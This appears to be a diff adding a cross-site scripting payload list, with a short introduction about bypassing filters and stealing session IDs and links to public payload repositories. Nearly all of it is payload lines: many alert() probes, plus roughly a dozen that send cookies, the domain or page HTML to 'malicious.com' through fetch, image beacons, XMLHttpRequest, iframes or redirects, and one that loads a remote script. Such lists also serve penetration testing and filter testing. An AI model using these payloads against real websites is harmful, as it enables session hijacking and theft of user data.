@@ -1,1 +1,70 @@
 
+Some XSS payloads may be blocked by security systems, or the payloads sent may not work due to the structure of the target system. In such cases, different payloads with varying functionalities can be used. Below is a table of commonly used payloads with various functions like displaying an alert box or stealing session IDs. These examples can be expanded, and it is possible to manually prepare payloads tailored to the target system when necessary.
+
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<img src="x" onerror="alert('XSS')">
+<svg/onload=alert('XSS')>
+"><script>alert('XSS')</script>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<input type="text" value="<script>alert('XSS')</script>">
+javascript:alert('XSS')
+onmouseover="alert('XSS')"
+"><iframe src="javascript:alert('XSS')"></iframe>
+<script src="http://example.com/malicious-code.js"></script>
+"><img src="javascript:alert('XSS')">
+<div style="background:url('javascript:alert('XSS')')"></div>
+<script>document.write('<img src="x" onerror="alert('XSS')">')</script>
+<a href="javascript:alert('XSS')">Click me!</a>
+<embed src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<style>@import 'javascript:alert("XSS")';</style>
+"><style>@import 'javascript:alert("XSS")';</style>
+<script>fetch("http://malicious.com/?cookie="+document.cookie)</script>
+<script>document.location='http://malicious.com/?cookie=' + document.cookie;</script>
+<script>new Image().src='http://malicious.com/?data=' + document.domain;</script>
+<script>new Image().src='http://malicious.com/?data=' + encodeURIComponent(document.body.innerHTML);</script>
+<script>fetch('https://malicious.com', { method: 'POST', body: JSON.stringify({cookie: document.cookie, location: document.location}) });</script>
+<script>document.cookie='username=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';</script>
+<script>document.domain='malicious.com';</script>
+"><script>document.location='http://malicious.com?cookie=' + document.cookie;</script>
+"><script>document.location='javascript:alert(document.cookie)';</script>
+"><script>document.location='javascript:alert(document.domain)';</script>
+<script>xhr=new XMLHttpRequest();xhr.open('GET','https://malicious.com?cookie='+document.cookie,true);xhr.send();</script>
+<script>xhr=new XMLHttpRequest();xhr.open('GET','https://malicious.com?data='+document.domain,true);xhr.send();</script>
+<script>var img=document.createElement('img');img.src='https://malicious.com?cookie='+document.cookie;document.body.appendChild(img);</script>
+<script>var img=document.createElement('img');img.src='https://malicious.com?data='+document.domain;document.body.appendChild(img);</script>
+<script>document.write('<iframe src="http://malicious.com?cookie=' + document.cookie + '"></iframe>');</script>
+<script>document.write('<iframe src="http://malicious.com?data=' + document.domain + '"></iframe>');</script>
+<script>localStorage.setItem('data', document.cookie);</script>
+<script>sessionStorage.setItem('data', document.domain);</script>
+<script>top.location=document.referrer;</script>
+<script>window.opener.location='http://malicious.com';</script>
+<script>window.parent.location='http://malicious.com';</script>
+
+
+
+
+
+
+
+
+
+-- Links --
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS
+https://github.com/payloadbox/xss-payload-list
+https://github.com/s0md3v/AwesomeXSS
+https://github.com/pgaijin66/XSS-Payloads
+
+
+*
+
+
+
+
+
+
